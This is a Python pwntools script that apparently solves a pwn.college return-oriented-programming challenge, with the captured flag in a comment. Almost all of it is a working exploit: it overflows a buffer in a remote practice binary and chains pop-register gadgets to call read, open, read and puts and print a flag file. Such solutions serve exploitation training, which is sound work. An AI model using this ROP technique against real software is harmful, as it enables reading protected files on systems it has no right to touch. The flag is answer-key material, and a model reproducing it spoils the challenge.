#!/usr/bin/env python3
#pwn_college{s-B6fYtJDYc0M4Yq0NsVeLj0Meg.dRjNywCN2gzW}
#python3 solution.py

from pwn import *

target_address_2 = 0x401a22 #pop rdi; ret;
target_address_3 = 0x401a1a  #pop rsi; ret;
target_address_4 = 0x401a12  #pop rdx; ret;
read_plt = 0x4010a4
open_plt = 0x4010c4
puts_plt = 0x401084



s = ssh(user="cse466", host="cse466.pwn.college", keyfile="/home/kali/.ssh/pwncollege-pwntool")
p = s.process("./babyrop_level6_testing1")
#p = process("./babyrop_level6_testing1")
#raw_input("attach gdb")

p.recvuntil("!\n###")

#pad = cyclic(128, n=8)
pad = b'A' * cyclic_find("laaaaaaa", n=8)


data_section="0x404500"

rdi = 0x00 # read from stdin
rsi = int(data_section, 16) # known memory address where flag's filename and later flag content gets copied
rdx = 0x08 # 8B flag
payload = pad + p64(target_address_2) + p64(rdi) + p64(target_address_3) + p64(rsi) + p64(target_address_4) + p64(rdx) + p64(read_plt) # read libc call

rdi = int(data_section, 16) # path where "flag" keyword is stored
rsi = 0x00
rdx = 0x00
payload += p64(target_address_2) + p64(rdi) + p64(target_address_3) + p64(rsi) + p64(target_address_4) + p64(rdx) + p64(open_plt) # open libc call

rdi = 0x03 # fd from open syscall
rsi = int(data_section, 16) # memory where content gets copied
rdx = 0x40 # 64B flag
payload += p64(target_address_2) + p64(rdi) + p64(target_address_3) + p64(rsi) + p64(target_address_4) + p64(rdx) + p64(read_plt) # read libc call

rdi = int(data_section, 16) # memory to read from
payload += p64(target_address_2) + p64(rdi) + p64(target_address_3) + p64(rsi) + p64(target_address_4) + p64(rdx) + p64(puts_plt) # puts libc call


print(payload)
p.sendline(payload)

flag_path = b'flag\x00\x00\x00\x00'
p.sendline(flag_path) # input 'flag' as a filename to store in known location in data_section

p.interactive()



